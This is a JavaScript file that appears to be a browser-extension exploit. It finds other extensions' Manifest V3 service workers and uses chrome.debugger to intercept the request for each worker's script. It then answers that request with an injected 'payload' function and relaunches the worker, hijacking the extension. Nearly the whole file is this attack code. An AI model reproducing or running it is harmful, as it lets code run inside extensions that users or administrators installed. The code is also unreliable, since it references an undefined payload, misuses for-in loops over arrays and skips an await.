function getAllTargets() {
  return new Promise(async (resolve, reject) => {
    let { targetInfos: targets } = await chrome.runtime.sendMessage({
      type: "get-targets",
    });
    resolve(targets);
  });
}

async function getManifestV3Targets() {
  const extensions = [];
  const allTargets = await getAllTargets();
  for (const target in allTargets) {
    const { protocol } = new URL(target.url);
    if (protocol == "chrome-extension:" && target.type == "service_worker") {
      extensions.push(target);
    }
  }
  return extensions;
}
async function onRequest(url) {
  await chrome.debugger.attach({ targetId: "browser" }, "1.3");
  chrome.debuggerPrivate.onEvent.addListener(async (details, type, event) => {
    if (event.request.url !== url) {
      await chrome.debugger.sendCommand(
        { targetId: "browser" },
        "Fetch.continueRequest",
        {
          requestId: event.requestId,
        }
      );
      return;
    }
    await chrome.debugger.sendCommand(
      { targetId: "browser" },
      "Fetch.fulfillRequest",
      {
        requestId: event.requestId,
        responseCode: 200,
        body: btoa(`(${payload.toString()})()`),
      }
    );
    await chrome.debugger.sendCommand(
      { targetId: "browser" },
      "Target.createTarget",
      {
        url: url,
      }
    );
  });
  await chrome.debugger.sendCommand({ targetId: "browser" }, "Fetch.enable");
  await chrome.debugger.detach({ targetId: "browser" });
}

async function setUpButtons() {
  let targets = getManifestV3Targets();
  for (const target in targets) {
    let button = document.createElement("button");
    button.textContent = targets[target].url;
    button.onclick = function () {
      onRequest(targets[target].url);
    };
    let id = document.createElement("h2");
    id.textContent = targets[target].id + " - " + targets[target].type;
    document.querySelector(".targets").appendChild(button);
    document.querySelector(".targets").appendChild(id);
  }
}